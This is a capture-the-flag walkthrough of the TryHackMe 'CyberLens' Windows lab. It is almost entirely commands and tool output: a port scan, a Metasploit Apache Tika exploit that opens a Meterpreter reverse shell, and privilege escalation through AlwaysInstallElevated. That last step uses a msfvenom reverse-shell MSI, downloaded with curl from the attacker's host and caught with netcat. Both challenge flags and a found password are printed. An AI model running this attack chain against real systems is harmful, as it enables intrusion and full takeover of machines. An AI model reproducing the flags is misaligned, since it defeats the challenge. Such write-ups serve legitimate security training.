
# CyberLens

Challenge Description
Welcome to the clandestine world of CyberLens, where shadows dance amidst the digital domain and metadata reveals the secrets that lie concealed within every image. As you embark on this thrilling journey, prepare to unveil the hidden matrix of information that lurks beneath the surface, for here at CyberLens, we make metadata our playground.

In this labyrinthine realm of cyber security, we have mastered the arcane arts of digital forensics and image analysis. Armed with advanced techniques and cutting-edge tools, we delve into the very fabric of digital images, peeling back layers of information to expose the unseen stories they yearn to tell.

Picture yourself as a modern-day investigator, equipped not only with technical prowess but also with a keen eye for detail. Our team of elite experts will guide you through the intricate paths of image analysis, where file structures and data patterns provide valuable insights into the origins and nature of digital artifacts.

At CyberLens, we believe that every pixel holds a story, and it is our mission to decipher those stories and extract the truth. Join us on this exciting adventure as we navigate the digital landscape and uncover the hidden narratives that await us at every turn.

Can you exploit the CyberLens web server and discover the hidden flags? 


Things to Note

1. Be sure to add the IP to your /etc/hosts file: `sudo echo 'MACHINE_IP cyberlens.thm' >> /etc/hosts`

2. Make sure you wait 5 minutes before starting so the VM fully starts each service

Answer the questions below

What is the user flag? 

Check

What is the admin flag?

```
nmap -n -Pn -sV --min-rate 1000 -v -p- -oN nmap 10.82.182.42
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-12-25 20:56 UTC
Nmap wishes you a merry Christmas! Specify -sX for Xmas Scan (https://nmap.org/book/man-port-scanning-techniques.html).
NSE: Loaded 46 scripts for scanning.
Initiating SYN Stealth Scan at 20:56
Scanning 10.82.182.42 [65535 ports]
Discovered open port 3389/tcp on 10.82.182.42
Discovered open port 135/tcp on 10.82.182.42
Discovered open port 445/tcp on 10.82.182.42
Discovered open port 80/tcp on 10.82.182.42
Discovered open port 139/tcp on 10.82.182.42
Increasing send delay for 10.82.182.42 from 0 to 5 due to max_successful_tryno increase to 4
Increasing send delay for 10.82.182.42 from 5 to 10 due to 22 out of 73 dropped probes since last increase.
Discovered open port 49671/tcp on 10.82.182.42
Increasing send delay for 10.82.182.42 from 10 to 20 due to max_successful_tryno increase to 5
Increasing send delay for 10.82.182.42 from 20 to 40 due to max_successful_tryno increase to 6
Increasing send delay for 10.82.182.42 from 40 to 80 due to 486 out of 1618 dropped probes since last increase.
Increasing send delay for 10.82.182.42 from 80 to 160 due to 101 out of 335 dropped probes since last increase.
Increasing send delay for 10.82.182.42 from 160 to 320 due to max_successful_tryno increase to 7
Discovered open port 49667/tcp on 10.82.182.42
Increasing send delay for 10.82.182.42 from 320 to 640 due to max_successful_tryno increase to 8
Discovered open port 49668/tcp on 10.82.182.42
Discovered open port 47001/tcp on 10.82.182.42
SYN Stealth Scan Timing: About 32.11% done; ETC: 20:58 (0:01:06 remaining)
Discovered open port 49666/tcp on 10.82.182.42
Discovered open port 49670/tcp on 10.82.182.42
Discovered open port 49683/tcp on 10.82.182.42
Discovered open port 5985/tcp on 10.82.182.42
SYN Stealth Scan Timing: About 66.35% done; ETC: 20:58 (0:00:31 remaining)
Discovered open port 49665/tcp on 10.82.182.42
Discovered open port 61777/tcp on 10.82.182.42
Increasing send delay for 10.82.182.42 from 640 to 1000 due to max_successful_tryno increase to 9
Discovered open port 49664/tcp on 10.82.182.42
Completed SYN Stealth Scan at 20:58, 101.07s elapsed (65535 total ports)
Initiating Service scan at 20:58
Scanning 16 services on 10.82.182.42
Service scan Timing: About 56.25% done; ETC: 20:59 (0:00:44 remaining)
Completed Service scan at 20:59, 56.68s elapsed (16 services on 1 host)
NSE: Script scanning 10.82.182.42.
Initiating NSE at 20:59
Completed NSE at 20:59, 1.73s elapsed
Initiating NSE at 20:59
Completed NSE at 20:59, 0.86s elapsed
Nmap scan report for 10.82.182.42
Host is up (0.16s latency).
Not shown: 65519 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Apache httpd 2.4.57 ((Win64))
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds?
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49670/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49683/tcp open  msrpc         Microsoft Windows RPC
61777/tcp open  http          Jetty 8.y.z-SNAPSHOT
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 160.52 seconds
           Raw packets sent: 100721 (4.432MB) | Rcvd: 88694 (3.882MB)
```






```
curl -I 10.82.182.42
HTTP/1.1 200 OK
Date: Thu, 25 Dec 2025 20:56:28 GMT
Server: Apache/2.4.57 (Win64)
Last-Modified: Wed, 11 Oct 2023 18:13:36 GMT
ETag: "224c-60774c8383bc8"
Accept-Ranges: bytes
Content-Length: 8780
Content-Type: text/html

```

```
msf exploit(windows/http/apache_tika_jp2_jscript) > options

Module options (exploit/windows/http/apache_tika_jp2_jscript):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]. Suppor
                                         ted proxies: sapni, socks4, socks5, socks5h, http
   RHOSTS     10.82.182.42     yes       The target host(s), see https://docs.metasploit.com/docs/using-metas
                                         ploit/basics/using-metasploit.html
   RPORT      9998             yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   SSLCert                     no        Path to a custom SSL certificate (default is randomly generated)
   TARGETURI  /                yes       The base path to the web application
   URIPATH                     no        The URI to use for this exploit (default is random)
   VHOST                       no        HTTP server virtual host


   When CMDSTAGER::FLAVOR is one of auto,tftp,wget,curl,fetch,lwprequest,psh_invokewebrequest,ftp_http:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SRVHOST  0.0.0.0          yes       The local host or network interface to listen on. This must be an addr
                                       ess on the local machine or 0.0.0.0 to listen on all addresses.
   SRVPORT  8080             yes       The local port to listen on.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     172.18.0.2       yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows



View the full module info with the info, or info -d command.

msf exploit(windows/http/apache_tika_jp2_jscript) > set rport 61777
rport => 61777
msf exploit(windows/http/apache_tika_jp2_jscript) > set lhost tun0
lhost => 192.168.216.31
msf exploit(windows/http/apache_tika_jp2_jscript) > run
[*] Started reverse TCP handler on 192.168.216.31:4444
[*] Running automatic check ("set AutoCheck false" to disable)
[+] The target is vulnerable.
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -   8.10% done (7999/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  16.19% done (15998/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  24.29% done (23997/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  32.39% done (31996/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  40.48% done (39995/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  48.58% done (47994/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  56.67% done (55993/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  64.77% done (63992/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  72.87% done (71991/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  80.96% done (79990/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  89.06% done (87989/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress -  97.16% done (95988/98798 bytes)
[*] Sending PUT request to 10.82.182.42:61777/meta
[*] Command Stager progress - 100.00% done (98798/98798 bytes)
[*] Sending stage (177734 bytes) to 10.82.182.42
[*] Meterpreter session 1 opened (192.168.216.31:4444 -> 10.82.182.42:49781) at 2025-12-25 21:02:55 +0000

meterpreter >
```


```
meterpreter > shell
Process 3048 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd \users
cd \users

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users

06/06/2023  07:48 PM    <DIR>          .
06/06/2023  07:48 PM    <DIR>          ..
03/17/2021  03:13 PM    <DIR>          Administrator
11/25/2023  07:31 AM    <DIR>          CyberLens
12/12/2018  07:45 AM    <DIR>          Public
               0 File(s)              0 bytes
               5 Dir(s)  14,949,773,312 bytes free

C:\Users>whoami
whoami
cyberlens\cyberlens

C:\Users>cd cyberlens
cd cyberlens

C:\Users\CyberLens>cd desktop
cd desktop

C:\Users\CyberLens\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\CyberLens\Desktop

06/06/2023  07:53 PM    <DIR>          .
06/06/2023  07:53 PM    <DIR>          ..
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
06/06/2023  07:54 PM                25 user.txt
               3 File(s)          1,106 bytes
               2 Dir(s)  14,949,773,312 bytes free

C:\Users\CyberLens\Desktop>type user.txt
type user.txt
THM{T1k4-CV3-f0r-7h3-w1n}
```


```
C:\Users\CyberLens\Documents\Management>type CyberLens-Management.txt
type CyberLens-Management.txt
Remember, manual enumeration is often key in an engagement ;)

CyberLens
HackSmarter123
```



```
https://github.com/itm4n/PrivescCheck


wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1



meterpreter > load powershell
Loading extension powershell...Success.
meterpreter >


meterpreter > powershell_import /root/hackdata/tryhackme/cyberlens/PrivescCheck.ps1
[+] File successfully imported. No result was returned.


msf exploit(windows/http/apache_tika_jp2_jscript) > sessions -t 120 -i 1
[*] Starting interaction with 1...

meterpreter > powershell_execute "Invoke-PrivescCheck"


[*] Status: Informational - Severity: None - Execution time: 00:00:00.003
????????????????????????????????????????????????????????????????
?                 ~~~ PrivescCheck Summary ~~~                 ?
????????????????????????????????????????????????????????????????
 TA0004 - Privilege Escalation
 - Configuration - MSI AlwaysInstallElevated ? High
 - Updates - Update History ? Medium
 TA0006 - Credential Access
 - Hardening - Credential Guard ? Low
 - Hardening - LSA Protection ? Low

WARNING: To get more info, run this script with the option '-Extended'.


```

```
meterpreter > shell
Process 4676 created.
Channel 2 created.
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1


C:\Windows\system32>reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Windows\Installer
    AlwaysInstallElevated    REG_DWORD    0x1
```


```
msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.216.31 LPORT=443 -a x64 --platform Windows -f msi -o rev.msi




python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.82.182.42 - - [25/Dec/2025 21:25:23] "GET /rev.msi HTTP/1.1" 200 -


curl http://192.168.216.31/rev.msi -o rev.msi
curl http://192.168.216.31/rev.msi -o rev.msi
  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current
                                 Dload  Upload   Total   Spent    Left  Speed
100  156k  100  156k    0     0   156k      0  0:00:01 --:--:--  0:00:01  188k


nc -lnvp 443



```

```
c -lnvp 443           
listening on [any] 443 ...
connect to [192.168.216.31] from (UNKNOWN) [10.82.182.42] 49866
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>cd \users\administrator\desktop
cd \users\administrator\desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is A8A4-C362

 Directory of C:\Users\Administrator\Desktop

06/06/2023  07:45 PM    <DIR>          .
06/06/2023  07:45 PM    <DIR>          ..
11/27/2023  07:50 PM                24 admin.txt
06/21/2016  03:36 PM               527 EC2 Feedback.website
06/21/2016  03:36 PM               554 EC2 Microsoft Windows Guide.website
               3 File(s)          1,105 bytes
               2 Dir(s)  14,935,732,224 bytes free

C:\Users\Administrator\Desktop>type admin.txt
type admin.txt
THM{3lev@t3D-4-pr1v35c!}
C:\Users\Administrator\Desktop>

```
# Rereferencias
## Tools
https://github.com/itm4n/PrivescCheck